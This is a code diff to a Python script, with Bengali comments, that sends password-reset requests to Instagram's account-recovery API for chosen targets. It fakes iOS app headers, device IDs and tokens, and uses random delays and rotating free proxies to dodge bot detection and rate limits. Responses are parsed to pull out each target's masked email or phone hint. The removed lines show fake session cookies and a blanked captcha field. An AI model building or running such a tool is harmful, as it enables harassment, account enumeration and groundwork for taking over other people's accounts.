@@ -4,24 +4,25 @@ import random
 import uuid
 import time
 
-# রিয়েল iOS ডিভাইস ও ভার্সন
-IOS_VERSIONS = ["16.1", "16.6", "17.0", "17.2", "17.4", "17.5"]
+IOS_VERSIONS = ["16.1", "16.6", "17.0", "17.4", "17.5"]
 DEVICES = [
     ("iPhone14,2", "iPhone 13 Pro"), ("iPhone15,2", "iPhone 14 Pro"),
     ("iPhone16,1", "iPhone 15 Pro"), ("iPhone16,2", "iPhone 15 Pro Max")
 ]
-LOCALES = ["en-US,en;q=0.9", "tr-TR,tr;q=0.9", "en-GB,en;q=0.9"]
+
+# 🚨 এখানে ফ্রি প্রক্সি বসাতে হবে
+# আপনি গুগলে "Free Proxy List" সার্চ করে এখানে বসাতে পারেন
+PROXIES = [
+    None,  # প্রথমে ডিরেক্ট কানেকশন ট্রাই করবে
+    # "http://188.12.34.56:8080",  <-- এখানে IP:PORT ফরম্যাটে প্রক্সি দিন
+]
 
 def get_headers():
     ios = random.choice(IOS_VERSIONS)
     dev_id, dev_name = random.choice(DEVICES)
-    locale = random.choice(LOCALES)
-    
-    # র‍্যান্ডম CSRF এবং সেশন কুকি তৈরি
     csrf = str(uuid.uuid4())
-    session_id = f"{random.randint(10,99)}%3A{random.randint(1000000000, 9999999999)}%3A{random.randint(10,99)}%3A{csrf[:10]}"
     
-    ua = f"Instagram 312.0.0.34.114 (iPhone; iOS {ios}; {locale}; {dev_name}; {dev_id})"
+    ua = f"Instagram 312.0.0.34.114 (iPhone; iOS {ios}; en_US; {dev_name}; {dev_id})"
     
     return {
         "User-Agent": ua,
@@ -31,48 +32,38 @@ def get_headers():
         "x-requested-with": "XMLHttpRequest",
         "x-csrftoken": csrf,
         "x-device-id": ''.join(random.choices('0123456789abcdef', k=16)),
-        "accept-language": locale,
+        "accept-language": "en-US,en;q=0.9",
         "content-type": "application/x-www-form-urlencoded",
-        # কুকি স্পুফিং (ফেক সেশন)
-        "Cookie": f"csrftoken={csrf}; ig_did={str(uuid.uuid4()).upper()}; ig_nrcb=1; sessionid={session_id};"
+        "Cookie": f"csrftoken={csrf}; ig_did={str(uuid.uuid4()).upper()};"
     }
 
 URL = "https://i.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
 
 def send_reset(target):
-    # বট ডিটেকশন এড়াতে ২-৫ সেকেন্ড দেরি
-    time.sleep(random.uniform(2.0, 5.0))
+    time.sleep(random.uniform(2.0, 4.0))
     
-    payload = {
-        "email_or_username": target, 
-        "flow": "fxcal",
-        "recaptcha_challenge_field": "",
-        "recaptcha_response_field": "manual_challenge"
-    }
+    # প্রক্সি সিলেক্ট করা হচ্ছে
+    proxy = random.choice(PROXIES)
+    mounts = {"http://": proxy, "https://": proxy} if proxy else None
+    
+    payload = {"email_or_username": target, "flow": "fxcal"}
 
     try:
-        with httpx.Client(http2=True, headers=get_headers(), timeout=30.0) as client:
+        with httpx.Client(http2=True, headers=get_headers(), proxies=mounts, timeout=30.0) as client:
             o = client.post(URL, data=payload)
             c = o.text.lower()
             
-            # রেসপন্স চেক
             if o.status_code == 429 or "rate limit" in c:
                 return "error:rate_limited"
             
             ev = re.search(r'[a-zA-Z0-9\*\._%+-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,}', c)
-            if ev: 
-                return f"email:{ev.group(0)}"
+            if ev: return f"email:{ev.group(0)}"
                 
-            if "fail" in c or "no user found" in c:
-                return "error:not_found"
+            if "fail" in c or "no user found" in c: return "error:not_found"
                 
             return "phone"
             
-    except httpx.TimeoutException:
-        return "error:timeout"
+    except httpx.ProxyError:
+        return "error:proxy_dead"
     except Exception as e:
         return f"error:{type(e).__name__}"
-
-# bot.py এর সাথে মিল রাখার জন্য
-def gen_headers():
-    return get_headers()
